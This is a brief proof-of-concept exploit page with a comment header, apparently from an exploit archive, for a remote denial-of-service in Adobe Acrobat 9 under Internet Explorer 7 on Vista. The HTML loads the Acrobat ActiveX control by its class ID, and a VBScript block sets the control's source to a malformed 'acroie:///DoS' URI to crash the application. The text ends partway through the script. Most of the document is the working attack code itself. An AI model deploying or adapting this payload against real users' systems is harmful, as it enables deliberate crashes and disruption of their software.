     Adobe Acrobat 9 Remote DoS (--) Tested on AA9/IE7/Vista
     I can't seem to reproduce this on XP! Oh well.
     Of course the most popular app for reading pdfs is SfS/SfI :)
     Basically it will crash with any uri that adobe doesn't like.
     Also interesting: try with file:///DoS and look in bottom left area -->

<html><body>

<object id=target classid=clsid:CA8A9780-280D-11CF-A24D-444553540000></object>
<script language=vbscript>

arg1="acroie:///DoS"
target.src = arg1
